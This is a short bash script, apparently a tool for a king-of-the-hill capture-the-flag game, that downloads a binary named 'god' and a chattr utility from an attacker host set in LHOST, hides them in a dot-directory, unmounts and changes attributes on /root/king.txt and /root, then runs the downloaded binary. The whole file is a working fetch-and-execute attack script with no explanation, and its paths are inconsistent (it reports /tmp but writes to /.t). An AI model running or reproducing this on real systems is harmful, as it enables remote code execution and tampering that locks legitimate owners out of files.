#!/bin/bash


if [ -z "$LHOST" ]; then
    echo "[!] LHOST not set. Use: LHOST=<ip> ./script.sh"
    exit 1
fi

BINARY="god" 

mkdir /.t
echo "[+] Downloading $BINARY from $LHOST..."
wget "http://$LHOST/$BINARY" -O "/.t/$BINARY" 2>/dev/null || {
    echo "[!] Download failed."
    exit 1
}

wget "http://$LHOST/chattr" -O "/.t/c" 2>/dev/null || {
    echo "[!] Download failed."
    exit 1
}

chmod +x /.t/c 

umount -l /root/king.txt 2>/dev/null
umount /root/king.txt 2>/dev/null
umount -l /root 2>/dev/null 

/.t/c -iacud /root/king.txt
/.t/c -iacud /root

chmod +x "/.t/$BINARY"
echo "[+] Saved and marked /tmp/$BINARY as executable."

/.t/god && rm god 
